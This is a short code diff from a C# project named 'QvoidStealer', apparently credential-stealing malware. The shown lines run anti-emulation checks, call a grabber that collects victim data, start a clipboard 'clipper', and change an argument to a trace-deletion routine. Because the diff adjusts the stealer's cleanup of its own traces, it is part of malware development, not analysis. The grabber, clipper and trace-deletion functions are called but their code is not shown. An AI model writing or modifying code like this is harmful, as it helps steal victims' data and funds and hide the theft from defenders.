@@ -26,7 +26,7 @@ namespace QvoidStealer
                 Protection.Emulation(Settings.AntiEmulation);
 
                 Grabber.Grab(args);
-                Grabber.DeleteTraces(false, true);
+                Grabber.DeleteTraces(false, false);
 
                 if (Settings.Clipper.Enabled)
                     Settings.Clipper.Start();
